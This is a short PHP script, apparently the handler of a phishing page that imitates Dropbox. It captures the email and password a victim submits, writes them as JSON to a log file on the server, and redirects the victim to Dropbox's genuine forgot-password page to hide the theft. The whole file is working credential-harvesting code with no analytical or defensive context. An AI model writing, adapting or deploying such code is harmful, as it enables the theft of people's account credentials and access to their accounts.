<?php

header('Location: https://www.dropbox.com/forgot/');
$data = array('site' => 'Dropbox',
  'user' => $_POST['login_email'],
  'pass' => $_POST['login_password']);

  $json_data = json_encode($data);

  $f = fopen('../../../logs/info.txt', 'w+');
  fwrite($f, $json_data);
  fclose($f);
exit();
?>